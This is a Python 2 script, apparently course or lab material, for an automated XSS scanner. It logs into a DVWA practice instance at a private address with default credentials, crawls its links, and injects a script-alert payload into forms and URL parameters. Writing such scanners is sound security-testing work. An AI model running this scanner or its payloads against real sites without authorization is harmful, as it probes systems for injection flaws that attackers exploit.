#!/usr/bin/env python

import requests
import urlparse
import re
from bs4 import BeautifulSoup

class Scanner:
    def __init__(self, url):
        self.target_url=url
        self.session = requests.Session()
        self.list_discover_links=[]
        self.logout = ["http://10.0.9.6/logout.php"]

    def run_scanner(self):
        data_dict = {"username": "admin", "password": "password", "Login": "submit"}
        self.session.post("http://10.0.9.6/dvwa/login.php",data=data_dict)
        for link in self.list_discover_links:
            forms = self.extract_forms(link)
            for form in forms:
                print("[+] Testing form URL  in " + link)
                response=self.test_xss_form(form,link)
                if response:
                    print("\t\t [+] Autodiscover XSS injection = "+str(response))
                    print("\n\n form "+str(form)+"\n\n")
            if "=" in link:
                response_link = self.test_xss_link(link)
                if response_link:
                    print("\t\t [+] Autodiscover XSS injection = " + str(response_link))

    def extract_web_links(self,target_url, protocol):
        if "http://" in target_url:
            protocol=""
        else:
            protocol="http://"
        response  = self.session.get(protocol+target_url)
        if response:
            return re.findall('(?:href=")(.*?)"', response.content)
        else:
            return []

    def crawling_internal(self, protocol, url):
        href_links = self.extract_web_links(url, protocol)
        for link in href_links:
            link = urlparse.urljoin(self.target_url, link)
            if "#" in link:
                link = link.split("#")[0]+link.split("#")[1]
            if protocol+url in link and link not in self.list_discover_links and link not in self.logout:
                print("\t [+] reference link Add to list ==> " + link)
                self.list_discover_links.append(link)
                self.crawling_internal(protocol, link.replace("https://", "").replace("http://",""))

    def extract_forms(self,url):
        response= self.session.get(url)
        parsed_html = BeautifulSoup(response.content)
        forms_list = parsed_html.findAll("form")
        return forms_list

    def test_xss_form(self, form, url):
        test = "<script>alert('hacked')</script>"
        response= self.submit_form(form, test, url)
        return "hacked" in response.content

    def test_xss_link(self, url):
        test= "<script>alert('hacked')</script>"
        response = self.session.get(url.replace("=", "="+test))
        return "hacked" in response.content


    def submit_form(self, form_list, value, url):
        print("\t[+] submit  url ==> " + url)
        #print("\t[+] submit  form ==> " + str(form_list))
        form= form_list
        if form:
            #print(form)
            action = form.get("action")
            if action:
                post_url = urlparse.urljoin(url, action)
            else:
                post_url = url
            post_data={}
            #print("\t[+] post url ==> " + post_url)
            #print("\t[+] action ==> " + action)
            method = form.get("method")
            #print("\t[+] method type ==> " + method)
            input_list = form.findAll("input")
            for input in input_list:
                input_name = input.get("name")
                input_type = input.get("type")
                input_value = input.get("value")
                if input_type == "text":
                    input_value= value
                post_data[input_name] = input_value
            print("\t\t[+++] post_url: "+post_url)
            if method =="post":
                return self.session.post(post_url, data=post_data)
            return self.session.get(post_url, params=post_data)



